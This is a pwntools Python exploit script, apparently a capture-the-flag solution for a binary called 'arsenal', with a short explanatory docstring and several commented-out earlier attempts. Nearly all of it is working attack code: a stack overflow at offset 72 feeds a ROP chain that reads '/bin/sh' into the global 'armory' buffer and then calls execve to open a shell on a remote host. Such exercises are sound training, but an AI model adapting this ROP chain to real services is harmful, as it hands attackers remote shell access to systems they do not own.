#!/usr/bin/env python3
from pwn import *

"""
Here the exercise can be solved using 2 approaches:
1) Write into the global buffer ARMORY(with READ) a shellcode that opens a shell (like the previouse ctf) and then make the memory executable with MPROTECT

2)Write into the global buffer ARMORY the string /bin/bash\x00, and then call EXECVE giving the buffer armory as the string pointer.

In order to solve it i prefered the 2nd approach.

"""
context.binary = elf = ELF('./arsenal', checksec=False)
context.arch = 'amd64'
#context.log_level = 'debug'
rop = ROP(elf)

OFFSET = 72

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
RET     = rop.find_gadget(['ret'])[0]

ARMORY = elf.symbols['armory']

binsh_text= b"/bin/sh\x00"

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13555)

p.recv()

payload = flat(

    b"A"*OFFSET,
     #call read(0, armory, 0x100)
    p64(POP_RAX), p64(0),       # READ syscall ID
    p64(POP_RDI), p64(0),       # 1st arg -> STDIN (da dove prendo l'input)
    p64(POP_RSI), p64(ARMORY),  # 2nd arg -> ARMORY address where to save it
    p64(POP_RDX), p64(len(binsh_text)),     # 3rd arg -> length of the input
    p64(SYSCALL),
    
    
    #call execve(const char *path, char *const _Nullable argv[], char *const _Nullable envp[]);
    p64(RET),
    p64(POP_RAX), p64(59),      # EXECVE syscall ID
    p64(POP_RDI), p64(ARMORY),  # 1st arg -> ARMORY address where is the path of the program to execute (bin/sh)
    p64(POP_RSI), p64(0),       # 2nd arg -> 0, i don't care
    p64(POP_RDX), p64(0),       # 3rd arg -> 0, i don't care
    p64(SYSCALL),

   
    

)


payload = payload.ljust(512, b"B") #i fill all the remaing "space" of the vuln read function(the read in the vuln read up to 512) in order to avoid that it CONSUME THE PAYLOAD

payload += binsh_text   #i add the /bin/sh\ , which is the text that the "call read" will read and save into ARMORY

#log.info(f"PAYLOAD: {payload}")
p.send(payload)
p.recv()
p.interactive()

"""
shellcode = asm(shellcraft.sh())
armory_addr = elf.sym.armory
page = armory_addr & ~0xfff #page alignment
 b"A"*OFFSET,

    p64(RET),
    p64(POP_RAX), p64(59),
    p64(POP_RDI), p64(ARMORY),
    p64(POP_RSI), p64(0),
    p64(POP_RDX), p64(0),
    p64(SYSCALL),

    # read(0, armory, 0x100)
    p64(POP_RAX), p64(0),
    p64(POP_RDI), p64(0),
    p64(POP_RSI), p64(ARMORY),
    p64(POP_RDX), p64(0x100),
    p64(SYSCALL),
"""
""" 
 #chiamo execve dando come stringa il buffer armory
    p64(POP_RAX), 59,        # execve
    p64(POP_RDI), p64(armory_addr),     # "/bin/sh"
    p64(POP_RSI), 0,
    p64(POP_RDX), 0,
    p64(SYSCALL),
    p64(RET),
    #
"""
"""
payload = flat(
    b"A"*OFFSET,
    p64(POP_RAX), 59,        # execve
    p64(POP_RDI), binsh,     # "/bin/sh"
    p64(POP_RSI), 0,
    p64(POP_RDX), 0,
    p64(SYSCALL),
    p64(RET),

   
)
"""


